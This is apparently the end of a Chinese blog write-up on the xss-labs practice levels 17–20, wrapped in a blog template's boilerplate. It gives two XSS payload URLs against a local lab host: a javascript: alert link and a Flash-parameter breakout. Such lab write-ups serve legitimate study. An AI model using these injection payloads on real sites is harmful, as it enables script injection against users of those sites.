+<p> 常规加尖括号的语句会被转为html实体字符，那就只有用事件触发来写，而且事件触发刚好是用等号来连接。</p>
+<p>这个插件在火狐里没办法访问到，必须在edge里面才行。</p>
+<h6 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h6><p>和17一样</p>
+<h6 id="level19-20"><a href="#level19-20" class="headerlink" title="level19-20"></a>level19-20</h6><p>观察源码发现语句间被单引号垄断并且只能规范书写，不仅对引号做了实体编码处理，而且将关键字当作普通文本，我们回去看看页面的图片，发现有说兼容性问题，那么就涉及到版本问题，我们可以将xsf03.swf进行反编译，得到version未定义，加上swf这个文件的特性可以传入参数。</p>
+<p>这题要反编译，我想留着看看这周末做汇编作业时候来看看，詹老师讲了一些但是我现在还不是很懂。</p>
+<p>先贴一下padload：</p>
+<p>19：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.111.138/xss-labs-master/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="string">&#x27;javascript:alert(/xss/)&#x27;</span>&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>20：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.111.138/xss-labs-master/level19.php?arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;<span class="keyword">if</span>(!self.a)self.a=!alert(1)//&amp;width&amp;height</span><br></pre></td></tr></table></figure>
+
+<p><strong>通用的通关方式，在页面后台添加一个事件，就是在后台的图片处直接添加。</strong></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hz</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/04/14/xss%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%E5%92%8C%E4%BE%8B%E9%A2%98/">http://example.com/2022/04/14/xss%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%E5%92%8C%E4%BE%8B%E9%A2%98/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">hz</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/xss/">
+                                    <span class="chip bg-color">xss</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/04/19/rce/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="rce">
+                        
+                        <span class="card-title">rce</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-19
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hz
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/rce/">
+                        <span class="chip bg-color">rce</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/04/13/misc-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="misc-内存取证(4.11-1.17)">
+                        
+                        <span class="card-title">misc-内存取证(4.11-1.17)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hz
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">hz</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/shianer" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:292595085@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=292595085" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 292595085" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
